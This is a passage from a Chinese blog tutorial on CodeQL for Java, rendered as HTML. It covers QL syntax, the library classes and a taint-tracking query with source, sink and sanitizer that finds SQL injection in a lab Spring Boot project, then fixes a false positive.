class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">bindingset [x] bindingset [y]</span><br><span class="line">predicate pulsOne(<span class="type">int</span> x,<span class="type">int</span> y) &#123;</span><br><span class="line">    y <span class="operator">=</span> x <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> x ,<span class="type">int</span> y</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">42</span> <span class="keyword">and</span> pulsOne(x, y)</span><br><span class="line"><span class="keyword">select</span> x,y</span><br></pre></td></tr></table></figure><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>在 CodeQL 中的类，<strong>并不意味着建立一个新的对象</strong>，而只是表示特定一类的数据集合，定义一个类，需要三个步骤：</p><ul><li>使用关键字<code>class</code></li><li>起一个类名，其中类名必须是首字母大写的。</li><li>确定是从哪个类中派生出来的</li></ul><p>其中，基本类型 <code>boolean</code>、<code>float</code>、<code>int</code>、<code>string</code> 以及 <code>date</code> 也算在内。</p><p>如官方的案例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class OneTwoThree extends <span class="type">int</span> &#123;</span><br><span class="line">    OneTwoThree() &#123; <span class="operator">/</span><span class="operator">/</span> characteristic predicate</span><br><span class="line">      this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> this <span class="operator">=</span> <span class="number">2</span> <span class="keyword">or</span> this <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    string getAString() &#123; <span class="operator">/</span><span class="operator">/</span> <span class="keyword">member</span> predicate</span><br><span class="line">      <span class="keyword">result</span> <span class="operator">=</span> &quot;One, two or three: &quot; <span class="operator">+</span> this.toString()</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    predicate isEven() &#123; <span class="operator">/</span><span class="operator">/</span> <span class="keyword">member</span> predicate</span><br><span class="line">      this <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">2</span>] </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">from</span> OneTwoThree i</span><br><span class="line">  <span class="keyword">where</span> i <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> i.getAString() <span class="operator">=</span> &quot;One, two or three: 2&quot;</span><br><span class="line">  <span class="keyword">select</span> i</span><br></pre></td></tr></table></figure><p><code>可以直接从输出的结果中查询到数据：输出1和2</code></p><p>其中，<strong>特征谓词</strong>类似于类的构造函数，它将会进一步限制当前类所表示数据的集合。它将数据集合从原先的 <code>Int</code> 集，进一步限制至 1-3 这个范围。<code>this</code> 变量表示的是当前类中所包含的数据集合。与 <code>result</code> 变量类似，<code>this</code>同样是用于表示数据集合直接的关系。</p><p>此外，在特征谓词中，比较常用的一个关键字是 <code>exists</code>。该关键字的语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exists</span>(<span class="operator">&lt;</span>variable declarations<span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>formula<span class="operator">&gt;</span>)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 以下两个 <span class="keyword">exists</span> 所表达的意思等价。</span><br><span class="line"><span class="keyword">exists</span>(<span class="operator">&lt;</span>variable declarations<span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>formula <span class="number">1</span><span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>formula <span class="number">2</span><span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">exists</span>(<span class="operator">&lt;</span>variable declarations<span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>formula <span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">and</span> <span class="operator">&lt;</span>formula <span class="number">2</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>这个关键字的使用引入了一些新的变量。如果变量中至少有一组值可以使 formula 成立，那么该值将被保留。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">predicate isStudent(<span class="keyword">Method</span> <span class="keyword">method</span>) &#123;</span><br><span class="line">    <span class="keyword">exists</span>( <span class="operator">|</span> method.hasName(&quot;getStudent&quot;) )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Method</span> <span class="keyword">method</span></span><br><span class="line"><span class="keyword">where</span>  isStudent(<span class="keyword">method</span>)</span><br><span class="line"><span class="keyword">select</span> method.getName(),method.getDeclaringType()</span><br></pre></td></tr></table></figure><h3 id="类库"><a href="#类库" class="headerlink" title="类库"></a>类库</h3><p>上面提到的<code>method</code>变量，具体和<code>java反射</code>中的变量相似，结合生成的<code>AST</code>结构的代码来看</p><p>比方说，我们想获取类中所有的方法，在AST里面的Method代表的就是类当中的方法，</p><p>我们想过的所有方法的调用，MethodAccess获取的就是所有方法调用</p><table><thead><tr><th>名称</th><th>解释</th></tr></thead><tbody><tr><td>Method</td><td>方法类，表示获取当前项目中所有的方法</td></tr><tr><td>MethodAccess</td><td>方法调用类，MethodAccess call表示获取当前项目中所有方法调用</td></tr><tr><td>Parameter</td><td>参数类，Parameter表示当前项目中所有存在的参数</td></tr></tbody></table><p>结合ql的语法，我们尝试获取micro-service-seclab项目中定义的所有方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Method</span> <span class="keyword">method</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">method</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207133722.png"></p><p>我们在通过Method类内置的一些方法，把结果过滤一下，比如我们获取的名字是<code>getStudent</code>的方法名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Method</span> <span class="keyword">method</span></span><br><span class="line"><span class="keyword">where</span> method.hasName(&quot;getStudent&quot;)</span><br><span class="line"><span class="keyword">select</span> method.getName(),method.getDeclaringType()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207134053.png"></p><blockquote><p>method.getName() 获取的是当前方法的名称</p><p>method.getDeclaringType() 获取的是当前方法所属class的名称。</p></blockquote><p>java 有 五大类库</p><ul><li><code>Program Elements</code>，程序元素，例如类和方法</li><li><code>AST nodes</code>，抽象树节点，例如语句和表达式</li><li><code>Metadata</code>，元数据，例如注解和注释</li><li><code>metrics</code>，计算指标，例如循环复杂度</li><li><code>Call Gragh</code>，调用图</li></ul><p>这些类包括：包（Package）、编译单元（CompilationUnit）、类型（Type）、方法（Method）、构造函数（Constructor）和变量（Variable）。</p><p>它们共同的超类是 Element，它提供了常用的成员谓词，用于确定程序元素的名称和检查两个元素是否相互嵌套。</p><p>因此可以方便的引用一个方法或构造函数的元素。此外，<code>Callable</code> 类是 <code>Method</code> 和 <code>Constructor</code> 的共同超类，可以用于此目的。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202181451240.png-water_print" alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202181451240.png-water_print"></p><p>具体如图所示</p><h4 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h4><p>类 Type 有许多子类，用于表示不同种类的类型。</p><ul><li><code>PrimitiveType</code> 表示原始类型，即 <code>boolean</code>, <code>byte</code>, <code>char</code>, <code>double</code>, <code>float</code>, <code>int</code>, <code>long</code>, <code>short</code>；QL 也将 <code>void</code> 和 <code>nulltype</code> 归为原始类型。</li><li>RefType是非原始类型，它又有几个子类。<ul><li><code>Class</code></li><li><code>interface</code></li><li><code>enum</code></li><li><code>Array</code></li></ul></li></ul><p>例如， 如果我们要查询程序中所有的<code>int</code>类型的变量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Variable v, PrimitiveType pt</span><br><span class="line"><span class="keyword">where</span> pt <span class="operator">=</span> v.getType() <span class="keyword">and</span></span><br><span class="line">    pt.hasName(&quot;int&quot;)</span><br><span class="line"><span class="keyword">select</span> v</span><br></pre></td></tr></table></figure><p>引用类型也是根据他们的声明范围来划分的</p><ul><li><code>TopLevelType</code> 代表在编译单元(一个 <code>.java</code> 文件)的顶层声明的类。</li><li><code>NestedType</code> 是一个在另一个类型内声明的类型。<ul><li><code>LoadClass</code>：在成员方法或构造方法中声明的类</li><li><code>AnonymousClass</code>：匿名类</li></ul></li></ul><p>如下，可以找到所有名称与编译单元不一致的顶层类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TopLevelType tl</span><br><span class="line"><span class="keyword">where</span> tl.getName() <span class="operator">!=</span> tl.getCompilationUnit().getName()</span><br><span class="line"><span class="keyword">select</span> tl</span><br></pre></td></tr></table></figure><p>最后，该库还有一些单例子类，如：<code>TypeObject</code>、<code>TypeCloneable</code>、<code>TypeRuntime</code>、<code>TypeSerializable</code>、TypeString、<code>TypeSystem</code> 和 <code>TypeClass</code>。每个 CodeQL 类都代表其名称所暗示的标准 Java 类。</p><p>一个找到所有直接继承 <code>Object</code> 的嵌套类的查询</p><blockquote><p>NestedClass  —-&gt; 嵌套类</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> NestedClass nc</span><br><span class="line"><span class="keyword">where</span> nc.getASupertype() instanceof TypeObject</span><br><span class="line"><span class="keyword">select</span> nc</span><br></pre></td></tr></table></figure><h4 id="Generics"><a href="#Generics" class="headerlink" title="Generics"></a>Generics</h4><p><code>GenericType</code> 是 <code>GenericInterface</code> 或 <code>GenericClass</code>。它代表了一个泛型型声明，如 Java 标准库中的接口 <code>java.util.Map</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.util.;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Map</span>&lt;K, V&gt; &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类型参数，如本例中的 K 和 V，由 <code>TypeVariable</code> 类表示。</p><p>一个泛型的参数化实例提供了一个具体实现该类型的参数，如 <code>Map&lt;String, File&gt;</code>。这样的类型由 <code>ParameterizedType</code> 表示，它与 <code>GenericType</code> 不同。要从 <code>ParameterizedType</code> 到其相应的 <code>GenericType</code>，可以使用谓词 <code>getSourceDeclaration</code>。</p><p>我们可以如下查到<code>java.util.Map</code> 的所有参数化实例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> GenericInterface map , ParameterizedType pt </span><br><span class="line"><span class="keyword">where</span> map.hasQualifiedName(&quot;java.util&quot;,&quot;Map&quot;) <span class="keyword">and</span></span><br><span class="line">    pt.getSourceDeclaration()<span class="operator">=</span>map</span><br><span class="line">    </span><br><span class="line"><span class="keyword">select</span> pt</span><br></pre></td></tr></table></figure><p>一般来说，泛型需要限制类型参数可以与哪些类型绑定。例如，一个从字符串到数字的映射类型可以被声明如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StringToNumMap</span>&lt;N <span class="keyword">extends</span> <span class="title class_">Number</span>&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;String, N&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味着 <code>StringToNumberMap</code> 的参数化实例只能使用 <code>Number</code> 或它的一个子类型来实例化类型参数 N，而不能用其它类，如说 <code>File</code>。我们说 <code>N</code> 是一个有界的类型参数，<code>Number</code> 是它的上界。在 QL 中，一个类型变量可以用谓词 <code>getATypeBound</code> 来查询它的类型边界。类型边界本身由 <code>TypeBound</code> 类表示，它有一个成员谓词 <code>getType</code> 来检索变量被约束的类型。</p><p>如下的查询找到所有以<code>Number</code>类型为边界的变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from TypeVariable tv , TypeBound tb</span><br><span class="line"><span class="type">where</span> <span class="variable">tb</span> <span class="operator">=</span> tv.getATypeBound() and</span><br><span class="line">    tb.getType().hasQualifiedName(<span class="string">&quot;java.lang&quot;</span>, <span class="string">&quot;Number&quot;</span>)</span><br><span class="line"></span><br><span class="line">select tv</span><br></pre></td></tr></table></figure><p>为了处理那些在泛型出现之前的遗留代码，每个泛型都有一个没有任何类型参数的 「原始」版本。在 CodeQL 库中，原始类型用 <code>RawType</code> 类表示，它有预期的子类 <code>RawClass</code> 和 <code>RawInterface</code>。同样，有一个谓词 <code>getSourceDeclaration</code> 用于获得相应的通用类型。如下的<a href="https://lgtm.com/query/4032913402499547882/">查询</a>可以找到（原始）类型 Map 的变量。实际上，现在仍然有许多项目在使用原始类型的 Map。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Variable v ,RawType rt</span><br><span class="line"><span class="type">where</span> <span class="variable">rt</span> <span class="operator">=</span> v.getType() and rt.getSourceDeclaration().hasQualifiedName(<span class="string">&quot;java.util&quot;</span>, <span class="string">&quot;Map&quot;</span>)</span><br><span class="line">select v</span><br></pre></td></tr></table></figure><h4 id="Variable"><a href="#Variable" class="headerlink" title="Variable"></a>Variable</h4><p>类 <code>Variable</code> 表示 Java 中的变量，它可以是一个类的成员字段（无论是否静态），也可以是一个局部变量，或者是函数的参数。因此，有三个子类来满足这些特殊情况的需要。</p><ul><li><code>Field</code> ：字段</li><li><code>LocalVariableDecl</code> ：本地变量.</li><li><code>Parameter</code> ：方法或构造函数的参数。</li></ul><h3 id="AST抽象语法树"><a href="#AST抽象语法树" class="headerlink" title="AST抽象语法树"></a>AST抽象语法树</h3><p>该类中包含了抽象语法树的节点，也就是语句（QL 中的类 <code>Stmt</code>）和表达式（QL 中的类 <code>Expr</code>）。关于标准 QL 库中可用的表达式和语句类型的完整列表，可以参考  <a href="https://codeql.github.com/docs/codeql-language-guides/abstract-syntax-tree-classes-for-working-with-java-programs/">https://codeql.github.com/docs/codeql-language-guides/abstract-syntax-tree-classes-for-working-with-java-programs/</a></p><p><code>Expr</code> 和 <code>Stmt</code> 都提供了成员谓词来获取程序的抽象语法树：</p><ul><li><code>Expr.getAChildExpr</code> 返回一个给定表达式的子表达式。</li><li><code>Stmt.getAChild</code> 返回直接嵌套在给定语句中的语句或表达式。</li><li><code>Expr.getParent</code> 和 <code>Stmt.getParent</code> 返回 AST 节点的父节点</li></ul><p>下面的<a href="https://lgtm.com/query/1947757851560375919/">查询</a>可以找到所有父类为返回语句的表达式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Expr e</span><br><span class="line"><span class="keyword">where</span> e.getParent() instanceof ReturnStmt</span><br><span class="line"><span class="keyword">select</span> e</span><br></pre></td></tr></table></figure><p>因此，程序中如果包含：<code>return x + y</code> 子表达式，QL 的查询结果将会返回：<code>x + y</code>。</p><p>下面的<a href="https://lgtm.com/query/1989464153689219612/">查询</a>可以找到某个表达式的父级为 if 语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Stmt s</span><br><span class="line">where s.getParent() <span class="keyword">instanceof</span> IfStmt</span><br><span class="line">select s</span><br></pre></td></tr></table></figure><p>一个<a href="https://lgtm.com/query/1016821702972128245/">查询</a>的例子，可以找到方法体。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Stmt s </span><br><span class="line">where s.getParent() <span class="keyword">instanceof</span> Method</span><br><span class="line">select s</span><br></pre></td></tr></table></figure><p>如上的这些例子可知，表达式的父节点并不总是表达式：它也可能是一个语句，例如 <code>IfStmt</code>。同样，语句的父节点也不总是一个语句：它也可能是一个方法或构造函数。为了抓住这一点，QL Java 库提供了两个抽象类 <code>ExprParent</code> 和 <code>StmtParent</code>，前者代表可能是表达式的父节点的任何节点，后者代表可能是语句的父节点的任何节点。</p><h3 id="Metadata（元数据）"><a href="#Metadata（元数据）" class="headerlink" title="Metadata（元数据）"></a>Metadata（元数据）</h3><p>除了 Java 程序代码本身之外，Java 程序还有几种元数据。其中包括有注解(Annotations) 和 Javadoc 注释。由于这些元数据对于加强代码分析或者是作为分析目标本身都很有用处，因此，QL 库定义了用于访问这些元数据的类。</p><p>对于注解(Annotations)，类 <code>Annotatable</code> 是所有可以被注解的程序元素的超类。这包括包、引用类型、字段、方法、构造函数和声明的局部变量。对于每个这样的元素，类中的谓词 <code>getAnAnnotation</code> 可以检索该元素可能有的任何注释。例如，下面的<a href="https://lgtm.com/query/3206112561297137365/">查询</a>可以找到构造函数上的所有注解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Constructor c </span><br><span class="line">select c.getAnAnnotation()</span><br></pre></td></tr></table></figure><h3 id="设置-source和sink"><a href="#设置-source和sink" class="headerlink" title="设置 source和sink"></a>设置 source和sink</h3><p>在自动化代码安全审计论中有一个核心的三元组概念：source,sink，sanitizer</p><blockquote><p>source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</p><p>sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</p><p>sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</p></blockquote><p>只有source和sink同时存在，并且从source到sink的链路是通的，才表示当前的漏洞是存在的。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207145013.png"></p><p>新定义的 <code>Config</code> 类继承于 <code>TaintTracking::Configuration</code>。类中重载的 <code>isSource</code> 谓语定义为污点的源头，而 <code>isSink</code> 定义为污点汇聚点。</p><p>在codeql中，我们通过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node src)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>来设置source</p><p>那么，我们在此靶场中的source是什么？</p><p>可以看到，我们所使用的是Springboot的框架，那么source就是http参数入口的代码参数，在<code>controller</code>中可以找到</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207145408.png"></p><p>这里的source就是<code>username</code></p><p><img src="C:\Users\12451\AppData\Roaming\Typora\typora-user-images\image-20211207145542653.png" alt="image-20211207145542653"></p><p>同理，这里的source就是<code>Student</code>对象</p><p>但是，在这里，我们将source设置为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node src)</span> &#123; src <span class="keyword">instanceof</span> RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure><blockquote><p>这是SDK自带的规则，里面包含了大多数常用的Source入口，其中也包括Springboot，我们可以直接使用</p><p>instance则是codeql提供的语法</p></blockquote><p>在codeql中，我们通过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来设置sink</p><p>在这里，我们将query方法(Method)的调用(MethodAccess)，所以我们设置sink为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    exists(Method method, MethodAccess call |</span><br><span class="line">      method.hasName(<span class="string">&quot;query&quot;</span>)</span><br><span class="line">      and</span><br><span class="line">      call.getMethod() = method and</span><br><span class="line">      sink.asExpr() = call.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="Flow数据流"><a href="#Flow数据流" class="headerlink" title="Flow数据流"></a>Flow数据流</h3><p>设置好了source和sink，我们就相当于搞定了首和尾，但是，只有连通才能决定是否存在漏洞</p><p>一个受污染的变量，能够毫无阻拦的流传到危险函数，就证明存在漏洞。</p><p>这个连通工作就是使用codeql引擎本身来完成的。我们通过使用config.hasFlowPath(source,sink)来判断是否连通，</p><p>比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, <span class="string">&quot;source&quot;</span></span><br></pre></td></tr></table></figure><p>我们传递给了config.hasFlowPath(Source,sink)我们定义好的source和sink，系统会自动帮我们判断是否存在漏洞</p><h2 id="初步codeql代码"><a href="#初步codeql代码" class="headerlink" title="初步codeql代码"></a>初步codeql代码</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @id java/examples/vuldemo</span></span><br><span class="line"><span class="comment"> * @name Sql-Injection</span></span><br><span class="line"><span class="comment"> * @description Sql-Injection</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this <span class="operator">=</span> &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">Method</span> <span class="keyword">method</span>, MethodAccess <span class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      <span class="keyword">and</span></span><br><span class="line">      call.getMethod() <span class="operator">=</span> <span class="keyword">method</span> <span class="keyword">and</span></span><br><span class="line">      sink.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> config.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>注意：上面的注释和其他语言是不一样的，不能删除，也是程序的一部分。因为我们在生成测试报告的时候，上面的name，description等信息会写入审计报告中。</p><p>这样，我们就拿到了最终的漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207160825.png"></p><h2 id="错误修改"><a href="#错误修改" class="headerlink" title="错误修改"></a>错误修改</h2><p>我们发现，上面自动审计出来的漏洞中，发现了一个误报</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207161032.png"></p><p>这个方法的参数是 List&lt;long&gt;，不可能存在注入漏洞</p><p>这说明，我们的规则里，对于List&lt;long&gt;型，甚至List&lt;Integer&gt;类型都会产生误报。source误把这种类型的参数涵盖了</p><p>我们需要采取手段消除这种误报,这个手段就是<code>isSanitizer</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207161647.png"></p><blockquote><p>isSanitizer是codeql的类TaintTracking::Configuration提供的净化方法。他的函数是：</p><p>override predicate isSanitizer(DataFlow::Node node){}</p><p>在Codeql自带的默认规则里，对当前的节点做了相应的判断</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSantizer(DataFlow::Node node)&#123;</span><br><span class="line"></span><br><span class="line">node.getType() instanceof PrimitiveType <span class="keyword">or</span></span><br><span class="line"></span><br><span class="line">node.getType() instanceof BoxedType <span class="keyword">or</span></span><br><span class="line"></span><br><span class="line">node.getType() instanceof NumberType</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表示如果当前节点是上面提到的基础类型，那么此污染链将被净化阻断，漏洞将不存在</p><p>由于Codeql检测SQL注入里的isSanitizer方法，只对基础类型做了判断，并没有对这种复合类型做判断，才引起了这次误报的问题</p><p>那么我们只要将这种符合类型的方法加入到isSanitizer，即可消除这种误报</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 